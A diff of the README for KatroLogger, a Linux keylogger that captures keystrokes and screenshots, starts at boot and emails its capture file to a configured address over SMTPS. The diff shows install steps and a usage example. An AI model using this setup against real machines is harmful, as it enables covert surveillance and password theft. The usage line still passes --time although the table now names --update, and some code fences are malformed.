@@ -1,33 +1,42 @@
-<h1 align="center">KatroLogger</h1>
-<h4 align="center"><code>KeyLogger for Linux Systems</code></h4>
-
 <p align="center">
   <a href="https://github.com/Katrovisch/KatroLogger">
-    <img src="https://github.com/Katrovisch/KatroLogger/blob/master/static/img/keylogger.png">
+    <img src="https://github.com/Katrovisch/KatroLogger/blob/master/static/img/logo.png">
   </a>
 </p>
 
-- **Features**
+---
+
+<h3 align="center"><code>KeyLogger for Linux Systems</code></h3>
+
+### Features
   - Runs on GUI systems or CLI
   - Sending data by email
   - Autorun on boot
   - Screenshots
 
-- **Dependencies**
-  - [libquickmail](https://sourceforge.net/projects/libquickmail/)
-```
+### Dependencies
+- [libcurl](https://curl.se/libcurl/)
+- [Cairo graphics library](https://www.cairographics.org/)
+- [libquickmail](https://sourceforge.net/projects/libquickmail/)
+
+Install libquickmail:
+```Shell
 wget https://ufpr.dl.sourceforge.net/project/libquickmail/libquickmail-0.1.29.tar.xz
+```Shell
 tar -xvf libquickmail-0.1.29.tar.xz
+```
+```Shell
 ./autogen.sh && ./configure && make && make install
 ```
 
-- **Compiling**
+### Install
+
 ```Shell
-./configure
-make
-make install
+./configure && make && make install
 ```
-- **Usage**
+
+### Usage
+
 ```Shell
 katrologger --output /path/file
 ```
@@ -35,28 +44,27 @@ katrologger --output /path/file
 
 | Argument | Description | 
 |---|---|
-| --smtp-status | status of sending email service |
-| --smtps-url | SMTPS server |
+| --smtp-status | email sending status |
 | --smtp-url | SMTP server |
+| --smtps-url | SMTPS server |
 | --port | SMTP port|
 | --mail-from | source email |
-| --mail-rcpt | receipt email |
 | --pass | password email |
+| --mail-rcpt | receipt email |
 | --smtp-file | attach key capture file for sending |
-| --time | time interval for sending, ex: --time 1-60 (minutes) |
-| --screen | screenshot, ex: --screen :0 (display) |
+| --update | update interval for sending email, 1-60 (minutes) |
+| --screen | screenshots (:0 is display default) |
 
-</br>
 
 ```Shell
 katrologger --smtps-url smtp.gmail.com --port 465 --mail-from <address> --mail-rcpt <address> --pass <password> --smtp-file /path/keyscan --time 10
 ```
 
-- **Uninstall**
+### Uninstall
 ```Shell
 make uninstall
 ```
 
-- **License**
+### License
 
 KatroLogger is licensed under the [GNU General Public License v3.0](https://github.com/Katrovisch/KatroLogger/blob/master/LICENSE)
